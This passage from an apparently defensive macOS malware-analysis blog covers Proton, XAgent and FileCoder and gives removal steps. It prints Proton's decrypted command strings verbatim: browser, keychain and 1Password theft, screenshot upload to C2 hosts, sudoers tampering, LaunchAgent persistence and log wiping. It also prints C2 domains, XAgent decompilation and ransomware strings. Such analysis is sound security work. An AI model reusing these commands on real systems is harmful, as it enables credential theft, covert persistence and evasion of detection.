		9fe4a0c3b63203f096ef65dc98754243979d6bd58fe835482b969aabaaec57e<br>
		</span>
		</div>
		<br>
		And what is in this encrypted file? A massive list of commands and configuration values.
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 13px;">
		<span class="n3rdFont">
		if [ -f %@/.crd ]; then cat %@/.crd; else echo failure; fi,<br>
		if [ -f %@/.ptrun ]; then echo success; fi,<br>
		touch %@/.ptrun;,<br>
		curl,<br>
		https://%@/kukpxx8lnldxvbma8c4xqtar/auth?B=%@&amp;U=%@&amp;S=%@,<br>
		echo '%@' | sudo -S echo success;,<br>
		rm -rf %@/%@.app %@;,<br>
		rm -rf ~/Library/LaunchAgents/%@*; ,<br>
		curl %@ -o %@ &amp;&amp; sudo chmod 777 %@;,<br>
		HandBrake needs to install additional codecs. Enter your password to allow this.,<br>
		screencapture -x %@/scr%@.png,<br>
		https://%@/api/upload,<br>
		%@/scr%@.png,<br>
		yyyy-MM-dd HH:mm:ss zzz,<br>
		ping -c 1 %@ 2&gt;/dev/null &gt;/dev/null &amp;&amp; echo 0,<br>
		%@.app,<br>
		cat %@/.crd,<br>
		if [ -f %@/.bcrd ]; then cat %@/.bcrd; else echo failure; fi,<br>
		echo '%@:%@:%@' &gt; %@/.crd; ,<br>
		echo 'printf &quot;\033[8;1;1t&quot;; echo &quot;%@&quot; | sudo -S sh -c &quot;echo 'Defaults !tty_tickets' &gt;&gt; /etc/sudoers&quot;; killall Terminal; sleep 1;' &gt; ~/Library/sco.command; chmod 777 ~/Library/sco.command; open ~/Library/sco.command &amp;&amp; sleep 2.7; rm -rf ~/Library/sco.command;,<br>
		echo '%@:%@:%@' &gt; %@/.crd,<br>
		AKADOMEDO,<br>
		CFBundleExecutable,<br>
		@%@/proton.zip,<br>
		/bin/sh,<br>
		https://%@,<br>
		-c,<br>
		a%@=`curl -s ,<br>
		api_key=%@&amp;cts=%@%@,<br>
		-F api_key=%@ -F cts=%@ -F signature=%@ https://%@/api/%@`; echo $a%@;,<br>
		echo '%@' | sudo -S rm -rf %@ %@/*.zip,<br>
		cat %@/.crd,<br>
		hcresult=`curl -s --connect-timeout 10 %@` &amp;&amp; echo $hcresult;,<br>
		type,<br>
		name,<br>
		path,<br>
		size,<br>
		creation_date,<br>
		modification_date,<br>
		folders,<br>
		files,<br>
		total_folders,<br>
		total_files,<br>
		folder,<br>
		--,<br>
		rm -rf %@,<br>
		%@/.str.txt,<br>
		-O -J https://%@,<br>
		0aaf7a0da92119ccf0ba,<br>
		%@/.tmpdata,<br>
		expiration_date,<br>
		grace_period,<br>
		os_version,<br>
		checksum,<br>
		%@/.hash,<br>
		codesign -dv %@,<br>
		VOID,<br>
		cd %@; curl,<br>
		hcresult=`curl -sL https://script.google.com/macros/s/AKfycbyd5AcbAnWi2Yn0xhFRbyzS4qMq1VucMVgVvhul5XqS9HkAyJY/exec` &amp;&amp; echo $hcresult;,
		zip %@/CR.zip ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Login\ Data ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Cookies ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Bookmarks ~/Library/Application\ Support/Google/Chrome/Profile\ 1/History ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Web\ Data; zip %@/CR_def.zip ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data ~/Library/Application\ Support/Google/Chrome/Default/Cookies ~/Library/Application\ Support/Google/Chrome/Default/Bookmarks ~/Library/Application\ Support/Google/Chrome/Default/History ~/Library/Application\ Support/Google/Chrome/Default/Web\ Data; ,<br>
		zip -r %@/FF.zip ~/Library/Application\ Support/Firefox/$(sh %@/mozilla.sh)/cookies.sqlite   ~/Library/Application\ Support/Firefox/$(sh %@/mozilla.sh)/formhistory.sqlite     ~/Library/Application\ Support/Firefox/$(sh %@/mozilla.sh)/logins.json     ~/Library/Application\ Support/Firefox/$(sh %@/mozilla.sh)/logins.json; ,<br>
		zip -r %@/SF.zip ~/Library/Cookies ~/Library/Safari/Form\ Values; ,<br>
		zip -r %@/OP.zip ~/Library/Application\ Support/com.operasoftware.Opera/Login\ Data ~/Library/Application\ Support/com.operasoftware.Opera/Cookies   ~/Library/Application\ Support/com.operasoftware.Opera/Web\ Data; ,<br>
		killall Console; killall Wireshark; rm -rf %@; ,<br>
		mkdir -p %@ %@ ~/Library/LaunchAgents/; chmod -R 777 %@ %@; zip -r %@/KC.zip ~/Library/Keychains/ /Library/Keychains/; %@ %@ %@ %@ zip -r %@/GNU_PW.zip ~/.gnupg ~/Library/Application\ Support/1Password\ 4  ~/Library/Application\ Support/1Password\ 3.9; zip -r %@/proton.zip %@; %@ echo success; ,
		cp -R %@ %@/%@; mv %@/%@/Contents/MacOS/%@  %@/%@/Contents/MacOS/%@; mv %@/%@/Contents/Resources/Info_.plist   %@/%@/Contents/Info.plist; mv %@/%@/Contents/Resources/%@.plist  ~/Library/LaunchAgents/%@.plist; echo success; ,<br>
		sed -i -e 's/P_MBN/%@/g' ~/Library/LaunchAgents/%@.plist; sed -i -e 's=P_UPTH=%@/%@/Contents/MacOS/%@=g' ~/Library/LaunchAgents/%@.plist; chmod 644 ~/Library/LaunchAgents/%@.plist; codesign --remove-signature %@/%@; rm -rf %@/%@/Ic*; launchctl load ~/Library/LaunchAgents/%@.plist; %@ ,<br>
		ACTION,<br>
		CONSOLE,<br>
		FM,<br>
		PROC,<br>
		SSH_DID_CONNECT,<br>
		SSH_DID_TERMINATE,<br>
		clsock,<br>
		_STROKES,<br>
		screencam,<br>
		exec_pointer,<br>
		ssh_bind_port,<br>
		procs,<br>
		total_procs,<br>
		SSH_DID_NOT_CONNECT,<br>
		/Library/Extensions/LittleSnitch.kext,<br>
		/Library/Extensions/Radio Silence.kext,<br>
		/Library/Extensions/HandsOff.kext,<br>
		%@/.tmpdata,<br>
		%@/updated.license,<br>
		license_enforce,<br>
		mv %@ %@,<br>
		handbrakestore.com,<br>
		handbrake.cc,<br>
		luwenxdsnhgfxckcjgxvtugj.com,<br>
		6gmvshjdfpfbeqktpsde5xav.com,<br>
		kjfnbfhu7ndudgzhxpwnnqkc.com,<br>
		yaxw8dsbttpwrwlq3h6uc9eq.com,<br>
		qrtfvfysk4bdcwwwe9pxmqe9.com,<br>
		fyamakgtrrjt9vrwhmc76v38.com,<br>
		kcdjzquvhsua6hlfbmjzkzsb.com,<br>
		ypu4vwlenkpt29f95etrqllq.com,<br>
		nc -G 20 -z 8.8.8.8 53  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo success,<br>
		echo '%@' &gt; /tmp/public.pem; openssl rsautl -verify -in %@/.tmpdata -pubin -inkey /tmp/public.pem,<br>
		a90=`curl -s --connect-timeout 10 -o /tmp/au https://%@/rsa` &amp;&amp; echo  &amp;&amp; echo '%@' &gt; /tmp/au.pub &amp;&amp; echo success,<br>
		openssl rsautl -verify -in /tmp/au -pubin -inkey /tmp/au.pub,<br>
		rm -rf /tmp/*,<br>
		sudo -k; echo '%@' | sudo -S rm -rf /var/log/* /Library/Logs/* &amp;&amp; echo success;,<br>
		mv %@/.crd %@/.bcrd,<br>
		sudo -k<br>
		</span>
		</div>
		<br>
		Reading those these commands confirms the advertised capabilites (e.g. screencapture, etc.) We can also see that it will collect and exfiltrate sensitive user data such as 1Password files, browser login data, keychains, etc:<br>
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		zip %@/CR.zip ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Login\ Data ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Cookies
		<br>
		<br>
		zip -r %@/KC.zip ~/Library/Keychains/ /Library/Keychains/; %@ %@ %@ %@ zip -r %@/GNU_PW.zip ~/.gnupg ~/Library/Application\ Support/1Password\ 4  ~/Library/Application\ Support/1Password\ 3.9; zip -r %@/proton.zip %@; %@ echo success
		<br>
		</span>
		</div>
		<br>
		<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
  		<span style="vertical-align:middle">disinfection:</span>
		</div>
		As Proton persists as Launch Agent, it's trivially to manually remove from an infected system. A slight complication arises as each variant uses a different file name (for both the Launch Agent plist list, and persistent binary). A tool such as <a class="inlineLink" href="https://objective-see.com/products/knockknock.html">KnockKnock</a>, which displays persistently installed software, can be used to identify the malware's Launch Agent plist. For example below, KnocKKnock has detected variant 'C', (<span class="n3rdFont">/Library/LaunchAgents/com.Eltima.UpdaterAgent.plist</span>):
		<br><br>
		<span><img src="../images/blog/blog_0x25/protonKnockKnock.png" width="800" style="display:block; margin:auto;"/></span>
		<br>
		Once the malicious Launch Agent plist has been determined, one can remove the malware from an infected system via the following steps (here, file naems are specific to variant 'C'):
		<ol>
		<li>Unload the malware's persistent launch agent via the <span class="n3rdFont">'launchctl unload'</span> command
			<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
			<span class="n3rdFont">
			$ launchctl unload /Library/LaunchAgents/com.Eltima.UpdaterAgent.plist<br>
			</span>
			</div>

		</li>
		<br>
		<li>Remove the malicious launch agent plist file <span class="n3rdFont">com.Eltima.UpdaterAgent.plist</span></li>
		<br>
		<li>Remove the malware's persistent binary: <span class="n3rdFont">/Library/.rand/updateragent.app</span></li>
		</ol>

	<br>
 	<span style="color: #95c02d; font-weight: bold;"><a id="XAgent"></a>XAgent:</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x25/xagent.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 12px;">
	  XAgent
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">Feburary, BitDefender/PaloAlto Networks</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">via OSX/Komplex</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">fully-featured backdoor with a propensity for 'intel-related' data (e.g. iOS backups, etc.)</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">kill process (and remove OSX/Komplex)</td>
	</tr>

	<tr style="border:none;">
	  <td style="border:none; vertical-align:top;"><b>writeups:</b></td>
	  <td style="border:none;">

	  	<ul style="list-style-type:square">
			<li><a class="inlineLink" href="https://researchcenter.paloaltonetworks.com/2017/02/unit42-xagentosx-sofacys-xagent-macos-tool/">"XAgentOSX: Sofacy's XAgent macOS Tool"</a> (PaloAlto Networks)</li>
			<li><a class="inlineLink" href="https://objective-see.com/blog/blog_0x18.html">"OSX/Proton.B, a brief analysis, at 6 miles up"</a> (P. Wardle/Objective-See)</li>
			<li><a class="inlineLink" href="https://labs.bitdefender.com/2017/02/dissecting-the-apt28-mac-os-x-payload-whitepaper-available/">"Dissecting the APT28 Mac OS X Payload"</a> (BitDefender)</li>
		</ul>
		
	  </td>
	</tr>
	</tbody>
	</table>
	<br>
	OSX/XAgent is APT28/Fancy Bear's fully-featured 2<sup>nd</sup>-stage macOS implant, installed via a 1<sup>st</sup>-stage implant, OSX/Komplex.
	<br>
	<br>
  	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
  		<span style="vertical-align:middle">infection:</span>
	</div>
  	In late 2016, PaloAlto Networks discovered a new macOS backdoor, OSX/Komplex, that was "associated with the Sofacy group [APT28]". In their writeup titled, <a class="inlineLink" href="http://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/">Sofacy's 'Komplex' OS X Trojan</a> they described it's infection vector, persistence, and features, noting amongst other things: "it is capable of downloading additional files...". 
  	<br><br>
  	I discussed Komplex both in the Objective-See <a class="inlineLink" href="https://objective-see.com/blog/blog_0x16.html#Komplex">"Mac Malware of 2016"</a> blog post, as well as in an <a class="inlineLink" href="https://speakerdeck.com/patrickwardle/rsa-2017-meet-and-greet-with-the-mac-malware-class-of-2016">RSA talk</a> on the same topic:
  	<br><br>
		<span><img src="../images/blog/blog_0x25/komplex.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
  	During my presentation, I noted that it seemed reasonable to assume that Komplex (which is rather a basic piece of malware), was simply a 1<sup>st</sup>-stage implant that likely downloaded and executed a 2<sup>nd</sup>-stage (more feature-complete), implant on targets of interest. With the discovery of XAgent, this was largely confirmed! Specifically BitDefender who performed a rather indepth analysis on XAgent state:
  	<br>

  	<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		"<i>[the Komplex payload] is the final component of the Komplex malware, with the sole purpose of downloading and executing a file, as requested by the C&amp;C servers.
			<br><br>
		In other words, Komplex is an APT28/Sofacy component that can be distributed via email, disguised as a PDF document, to establish a foothold in a system. Once it infects the host, it can download and run the next APT28/Sofacy component, which - to the best of our
		knowledge - is the XAgent malware...
		<br>
		<br>
		Our assumption is guided by hard evidence included in the binary. Our forensics endeavor revealed a number of indicators that made us think XAgent was distributed via Komplex malware</i>"
		</span>
	</div>
	<br>
	PaloAlto Networks also echos this noting: "<i>We believe it is possible that Sofacy uses Komplex to download and install the XAgentOSX tool to use its expanded command set on the compromised system.</i>"
	<br><br>
	Thus in other words, XAgent may not have an independent infection vector, but instead relies on OSX/Komplex infections.
	<br>
	<br>
  	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
  		<span style="vertical-align:middle">persistence:</span>
	</div>
	As of yet, I have not uncovered anything that indicates that XAgent actually persists. None of the analysis reports (from the AV companies) mentions persistence, and reversing the malware's binary doesn't reveal any (apparent) persistence logic. Could this means its persistence mechanism just hasn't been figured out yet? Possibly. However, I think there may be a more plausible answer, that involves XAgent's relationship with Komplex
	<br><br>
	Recall that XAgent is downloaded and executed by Komplex. That is to say, it is dependent on Komplex, at least in terms of getting onto macOS systems. Now, Komplex is persistent, via the Launch Agent <span class="n3rdFont">~/Library/LaunchAgents/com.apple.updates.plist</span> file:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ cat ~/Library/LaunchAgents/com.apple.updates.plist<br>
	&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>
	&lt;plist version=&quot;1.0&quot;&gt;<br>
	&lt;dict&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;key&gt;Label&lt;/key&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;string&gt;com.apple.updates&lt;/string&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;key&gt;ProgramArguments&lt;/key&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;array&gt;<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;/Users/Shared/.local/kextd&lt;/string&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;/array&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;key&gt;<b>RunAtLoad</b>&lt;/key&gt;<br>
   	&nbsp;&nbsp;&nbsp;<b>&lt;true/&gt;</b><br>
   	...
    <br>
	</span>
	</div> 
	<br>
	As the <span class="n3rdFont">RunAtLoad</span> key is set to true, each time an infected system is rebooted, Komplex (<span class="n3rdFont">/Users/Shared/.local/kextd</span>), will be automatically (re)executed by the OS. Once Komplex is running, it will check in with it's command &amp; control servers. Depending on the configuration of these servers or tasking from the remote attackers, a command to restart XAgent could perhaps be issued. Or, Xagent could be fully (re)downloaded and (re)executed. This approach would minimize the footprint of XAgent, as persistence events (i.e. the creation of a Launch Agent plist file) is both 'noisy' and trivial to detect. 
	<br>
	<br>
	Another scenario that could explain the lack of persistence may be that the attackers did not need (nor want) XAgent to persist. Running it once (via Komplex), collecting all data of intelligence value, then (possibly) issuing a command to delete the XAgent binary would certainly reduce the likelyhood of its detection. As 2<sup>nd</sup>-stage implants such as XAgent usually represent a significant development effort (both in terms of time and cost), attackers will often take steps (such as uploaded/execute/delete) to prevent their detection and ensure their longevity!
	<br>
	<br>
	<div>
		<img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
		<span style="vertical-align:middle">features:</span>
	</div>
	XAgent is a fully-featured macOS backdoor, with a propensity for the collection of data that may hold intelligence value. For example, dumping the Objective-C class information via <a class="inlineLink" href="http://www.newosxbook.com/tools/jtool.html"<span class="n3rdFont">jtool</span></a>, we see classes and methods responsible for keylogging, app injection, screen capturing, password stealing, and even discovery of iOS backups:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ ./jtool -d objc -v XAgent<br>
	<br>
	@interface <b>Keylogger</b><br>
	/* 0 - 0x100010708 */ - init;<br>
	/* 1 - 0x1000108f2 */ - initEventTapAndStartRunLoop;<br>
	/* 2 - 0x1000109fa */ - setAccessibilityApplication;<br>
	...<br>
	/* 7 - 0x100010e80 */ - start;<br>
	/* 8 - 0x100010fad */ - stop;<br>
	...<br>
	/* 11 - 0x100011030 */ - sendLog;<br>
	...<br>
	<br>
	@interface <b>InjectApp</b>
	<br>
	/* 0 - 0x10000fb18 */ - init;<br>
	/* 1 - 0x10000fb45 */ - isInjectable:;<br>
	/* 2 - 0x10000fbe3 */ - sendEventToPid:;<br>
	/* 3 - 0x10000fdff */ - injectRunningApp;<br>
	<br>
	@interface <b>ScreenShot</b>
	/* 0 - 0x100015c38 */ - takeScreenShot;<br>
	/* 1 - 0x100015c97 */ - convertImageToData:;<br>
	/* 2 - 0x100015dc4 */ - takeScreenShotImage;<br>
	<br>
	@interface <b>Password</b>
	/* 0 - 0x10001662d */ - init;<br>
	...<br>
	/* 4 - 0x100016dcb */ - getFirefoxPassword;<br>
	<br>
	@interface MainHandler<br>
	...<br>
	/* 11 - 0x10000b9d7 */ - <b>showBackupIosFolder;</b>
	<br>
	<br>
	@interface RemoteShell<br>
	...<br>
	/* 5 - 0x100018ccd */ - <b>checkBackupIosDeviceFolder</b>;
	<br>
	</span>
	</div>
	<br>
	Taking a peak at the malware's decompilation for the '<span class="n3rdFont">checkBackupIosDeviceFolder</span>' method reveals it invoking <span class="n3rdFont">popen</span> to execute <span class="n3rdFont">ls -la ~/Library/Application\ Support/MobileSync/Backup/</span>. This will, as its name suggests, check (or list) and iOS backups stored on the infected Mac. Obviously iOS backups contain an (unparalled?) wealth of data and information!

	<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:14px;">
		<span class="n3rdFont">
		void * -[RemoteShell checkBackupIosDeviceFolder](void * self, void * _cmd) {<br>
    	&nbsp;&nbsp;&nbsp;...<br>
    	&nbsp;&nbsp;&nbsp;rbx = popen("<b>ls -la ~/Library/Application\ Support/MobileSync/Backup/</b>", "r");<br>
    	<br>
		</span>
	</div>
	<br>
	Note: for an interesting connection between XAgent and the Italian HackingTeam, see Objective-See's blog post, <a class="inlineLink" href="https://objective-see.com/blog/blog_0x18.html">From Italy With Love? Finding HackingTeam Code in Russian Malware</a>.
	<br>
	<br>
	In terms of other features, as shown in BitDefender's report, <a class="inlineLink" href="https://labs.bitdefender.com/2017/02/dissecting-the-apt28-mac-os-x-payload-whitepaper-available/">"Dissecting the APT28 Mac OS X Payload"</a>, XAgent unsurprisingly also supports more prosaic commands:
	<br><br>
		<span><img src="../images/blog/blog_0x25/xagentFeatures.png" width="657" style="display:block; margin:auto;"/></span>
	<br>
	<br>
	<div>
		<img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
		<span style="vertical-align:middle">disinfection:</span>
	</div>
	As XAgent does not appear to persist itself, removing it simply involves terminating the backdoor and deleting its binary. Unfortunately, the malware contains logic to generate a random path and name for itself, so figuring out the location of the backdoor at first, seems complicated. Below is the decompilation of the <span class="n3rdFont">generateRandomPathAndName</span> method, which is responsible for implementing this logic:
	<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 13px;">
		<span class="n3rdFont">
		void * +[Launcher generateRandomPathAndName](void * self, void * _cmd) {<br>
		<br>
    &nbsp;&nbsp;&nbsp;r15 = [NSArray arrayWithObjects:<b>@"kshd", @"paxs", @"exprd", @"rcp", @"sync", @"kex", @"zsc",<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @"scpo", @"ddl", @"update", @"zsg", @"rep", @"skgc",</b> ..."];<br>
    &nbsp;&nbsp;&nbsp;<br>
    &nbsp;&nbsp;&nbsp;var_38 = r15;<br>
    &nbsp;&nbsp;&nbsp;rax = [NSArray arrayWithObjects:<b>@".localized", @".com.apple.kshd", @".com.apple.erx",<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  @".com.apple.fsg", @".com.apple.ulk", @".com.apple.wsat",</b> ..., 0x0];<br>
    <br>
    &nbsp;&nbsp;&nbsp;r14 = [rax count];<br>
    &nbsp;&nbsp;&nbsp;var_40 = [r15 count];<br>
    &nbsp;&nbsp;&nbsp;r15 = NSHomeDirectory();<br>
    &nbsp;&nbsp;&nbsp;r14 = [rax objectAtIndex:[Launcher randomInteger:0x0 max:r14]];<br>
    &nbsp;&nbsp;&nbsp;r12 = [NSString stringWithFormat:@"%@/Library/Assistants/.local/%@", r15, r14];<br>
    &nbsp;&nbsp;&nbsp;rbx = [NSFileManager defaultManager];<br>
    &nbsp;&nbsp;&nbsp;[rbx createDirectoryAtPath:r12 withIntermediateDirectories:0x1 attributes:0x0 error:0x0];<br>
    &nbsp;&nbsp;&nbsp;rbx = [var_38 objectAtIndex:[Launcher randomInteger:0x0 max:var_40]];<br>
    &nbsp;&nbsp;&nbsp;r14 = [NSString stringWithFormat:@"%@/%@", r12, rbx];<br>
    &nbsp;&nbsp;&nbsp;return rax;<br>
	}
	</span>
	</div>
	<br>
	As can be seen, the malware will randomly generate a (sub)directory and name for itself. However as the path is not fully randomized (i.e. it starts with <span class="n3rdFont">~/Library/Assistants/.local/</span>), one can simply look for a running process who's path is prefixed with that directory.
	<br>
	<br>
	Since <span class="n3rdFont">~/Library/Assistants/.local/</span> is a non-standard directory created by the malware, if one is infected there should only be a single running process running out of this directory:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
		$ ps aux | grep -i /Library/Assistants/.local<br>
		user 666 /Users/user/Library/Assistants/.local/.com.apple.kshd/mpil<br>
	</span>
	</div>
	<br>
	Kill this process (e.g. <span class="n3rdFont">kill -9 666</span>), and delete the <span class="n3rdFont">~/Library/Assistants/.local/</span> directory to cleanup an XAgent infection.
	<br>
	<br>
	As noted though, XAgent is dependent Komplex. Thus, if an XAgent infection is found, check for Komplex as well (details <a class="inlineLink" href="https://objective-see.com/blog/blog_0x16.html#Komplex">here</a>).
	<br>

	<br>
 	<span style="color: #95c02d; font-weight: bold;"><a id="FileCoder"></a>FileCoder (FindZip/Patcher):</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x25/fileCoder.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 12px;">
	  FileCoder (FindZip/Patcher)
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">Feburary, ESET</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">Fake 'Patcher' Applications</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">file encryption for ransom</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">terminate application</td>
	</tr>

	<tr style="border:none;">
	  <td style="border:none; vertical-align:top;"><b>writeups:</b></td>
	  <td style="border:none;">
	  	<a class="inlineLink" href="https://www.welivesecurity.com/2017/02/22/new-crypto-ransomware-hits-macos/">"New crypto-ransomware hits macOS"</a> (ESET)
	  </td>
	</tr>
	</tbody>
	</table>
	<br>
	This poorly coded piece of macOS ransomware, encrypts all user files with (pseudo)randomly generated encryption key that is neither saved, nor transmitted to the remote attacker. Fortunately a 'known plaintext attack' can decrypt ransomed files!
	<br>
  <br>
  <div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
  		<span style="vertical-align:middle">infection:</span>
	</div>
  It's a well known 'security mantra' that running apps related to pirating software is a terrible idea! And FileCoder (FindZip/Patcher) is a perfect example of why. Distributed via BitTorrent distro sites, this malware masquerades as software able to crack (or patch) popular applications, such as Adobe Premiere Pro and Microsoft Office. 
  <br>
  <br>
  In their report, <a class="inlineLink" href="https://www.welivesecurity.com/2017/02/22/new-crypto-ransomware-hits-macos/">"New crypto-ransomware hits macOS"</a>, ESET researchers provide the following screen shot of the malware ("ostensibly an application for pirating popular software"):
  	<br><br>
		<span><img src="../images/blog/blog_0x25/fileCoderDistribution.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	If the user downloads and attempts to run the application (for example to crack Adobe or Microsoft products), Gatekeeper should block the malware. This is due to the fact, that though the malware is signed it is done so 'ad-hoc' - meaning it is not signed by Apple (or by an Apple Developer ID). This can be seen via <a class="inlineLink" href="http://www.newosxbook.com/tools/jtool.html">jtool</a>:

	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 15px;">
		<span class="n3rdFont">
		$ ./jtool --sig "Office 2016 Patcher.app/Contents/MacOS/Office 2016 Patcher"<br>
		Blob at offset: 43776 (9936 bytes) is an embedded signature<br>
		Code Directory (339 bytes)<br>
		&nbsp;&nbsp;&nbsp;Version:     20100<br>
		&nbsp;&nbsp;&nbsp;Flags:       <b>adhoc</b> (0x2)<br>
		&nbsp;&nbsp;&nbsp;CodeLimit:   0xab00<br>
		&nbsp;&nbsp;&nbsp;Identifier:  NULL.prova (0x30)<br>
		&nbsp;&nbsp;&nbsp;CDHash:	     0d35855003ce4f920addb805fb240786443169c4 (computed)<br>
		</span>
		</div>
	<br>
	Or, if one prefers a UI application to view signing information, my <a class="inlineLink" href="https://objective-see.com/products/whatsyoursign.html">WhatsYourSign</a> Finder extension, will display this information as well:
	<br><br>
		<span><img src="../images/blog/blog_0x25/fileCoderSigned.png" width="742" style="display:block; margin:auto;"/></span>
	<br>
	Now, if the user disables Gatekeeper, or explicitly agrees to allow the malicious application to execute, they will become infected.
  	<br>
	<br>
  	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
  		<span style="vertical-align:middle">persistence:</span>
	</div>
	As is often the case with ransomware, which has no need to persist (it simply encrypts users' files, then exits), FileCoder makes no effort to install itself persistently. From the malware author's point of view, avoding the need to persist simplifies the malware creation process.
	<br>
	<br>
	<div>
		<img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
		<span style="vertical-align:middle">features:</span>
	</div>
	FileCode does one thing; encrypt user files for ransom. When executed it display a window with a 'START' button:
	<br><br>
		<span><img src="../images/blog/blog_0x25/fileCoderWindow.png" width="480" style="display:block; margin:auto;"/></span>
	<br>
	Clicking this button executes the function, <span class="n3rdFont">sub_100001f50</span>. Extracting strings from this massive function reveals its likely purpose; encrypting user files:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  Press START button to crack/patch Office 2016<br>
  Patching Office Please Wait<br>
  Process 0/3<br>
  /Documents/README!.txt<br>
  ...<br>
  /usr/bin/find<br>
  -iname<br>
  README!.txt-print<br>
  exec<br>
  touch<br>
  -mt<br>
  201002130000<br>
  {}<br>
  ;<br>
  /Users/<br>
  -not<br>
  zip<br>
  -0<br>
  -P<br>
  {}.crypt<br>
  rm<br>
  Patching Office Please Wait<br>
  It may take up to 10 minutes<br>
  Process 1/3<br>
  /Desktop/README<br>
  /Desktop/HOW_TO_DECRYPT<br>
  /Desktop/DECRYPT<br>
  -maxdepth<br>
  Patching Office Please Wait<br>
  It may take up to 10 minutes<br>
  Process 2/3<br>
  /Volumes/<br>
  /usr/bin/diskutil<br>
  secureErase<br>
  freespace<br>
  DONE!<br>
  Read the README.txt file on your Desktop!<br>
  </div>
  <br>
  Running a process monitor (such as my open-source <a class="inlineLink" href="https://github.com/objective-see/ProcInfo">ProcInfo</a> tool), confirms the malware's malicious behavior. Specifically we can see it executing the built-in <span class="n3rdFont">find</span> utility to, well, find user files, then executing the <span class="n3rdFont">zip</span> utilty, with the <span class="n3rdFont">-P</span> flag create a password protected zip file (password here, <span class="n3rdFont">gpcwPophFOZQjMDUnfQoqv9Ry</span>):

